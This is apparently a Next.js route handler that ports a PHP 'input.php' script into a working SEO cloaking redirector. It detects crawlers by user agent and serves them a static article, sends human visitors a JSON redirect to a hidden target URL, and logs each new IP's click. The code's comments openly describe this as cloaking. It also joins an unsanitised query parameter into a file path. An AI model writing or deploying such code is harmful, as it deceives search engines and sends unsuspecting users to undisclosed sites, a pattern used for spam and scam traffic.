import { NextRequest, NextResponse } from 'next/server'
import { promises as fs } from 'fs'
import path from 'path'
import { db } from '@/lib/db'
import { isCrawler, getClientIp } from '@/lib/crawler-detect'

// Force Node.js runtime: crawler-detect + Prisma + file reads are Node-only.
export const runtime = 'nodejs'
export const dynamic = 'force-dynamic'

const ARTICLES_DIR = path.join(process.cwd(), 'public', 'articles')

/**
 * Replacement for the legacy `server_dir/input.php`.
 *
 * Behaviour (identical to the original server version):
 *  1. Read `ids` query param. 400 if missing/empty.
 *  2. Detect crawler from User-Agent.
 *     - Crawler  -> serve the static HTML article at /articles/<ids>.html
 *                   (this is the SEO cloaking: Googlebot sees real content).
 *  3. Human visitor:
 *     - Look up an active RedirectRule for this articleId.
 *       - Found   -> log the click (once per IP) and return JSON
 *                    {"redirectUrl": "..."} (good.js then does location.replace).
 *       - Not found -> serve the HTML article (same as crawler).
 *  4. If the article file doesn't exist -> JSON {"redirectUrl": "https://www.google.com"}.
 *
 * Logging uses Prisma (SQLite in dev). On Vercel production point DATABASE_URL at
 * a real DB (Postgres/Vercel Postgres/Neon); the flat-file data/*.log approach
 * cannot work because Vercel's filesystem is read-only.
 */
export async function GET(request: NextRequest) {
  const ids = request.nextUrl.searchParams.get('ids')?.trim() || ''

  if (!ids) {
    return new NextResponse('Invalid or missing ids parameter', { status: 400 })
  }

  const ua = request.headers.get('user-agent') || ''
  const ip = getClientIp(request.headers)
  const articlePath = path.join(ARTICLES_DIR, `${ids}.html`)

  // Helper to stream back a static article HTML file.
  const serveArticle = async () => {
    try {
      const html = await fs.readFile(articlePath, 'utf8')
      return new NextResponse(html, {
        status: 200,
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
      })
    } catch {
      return NextResponse.json(
        { redirectUrl: 'https://www.google.com' },
        { status: 404 }
      )
    }
  }

  // 1. Crawler -> always show the article (SEO).
  if (isCrawler(ua)) {
    return serveArticle()
  }

  // 2. Human -> check redirect rule.
  const rule = await db.redirectRule.findUnique({
    where: { articleId: ids },
  })

  if (rule && rule.active && rule.targetUrl) {
    // Log once per IP (mirrors the old is_new_ip() guard in input.php).
    const known = await db.knownIp.upsert({
      where: { ip },
      update: {},
      create: { ip },
    })

    // Only count the click if this IP is new (createdAt within the last second
    // means it was just created by the upsert above).
    const isNew = Date.now() - known.createdAt.getTime() < 2000

    if (isNew) {
      await db.$transaction([
        db.redirectRule.update({
          where: { id: rule.id },
          data: { clicks: { increment: 1 } },
        }),
        db.clickLog.create({
          data: { articleId: ids, targetUrl: rule.targetUrl, ip, ua: ua.slice(0, 500) },
        }),
      ])
    }

    return NextResponse.json(
      { redirectUrl: rule.targetUrl },
      {
        status: 200,
        headers: {
          'Content-Type': 'application/json; charset=utf-8',
          'Cache-Control': 'no-store',
        },
      }
    )
  }

  // 3. Human without a redirect rule -> show the article.
  return serveArticle()
}

// Support POST too (some callers POST). Same logic.
export const POST = GET
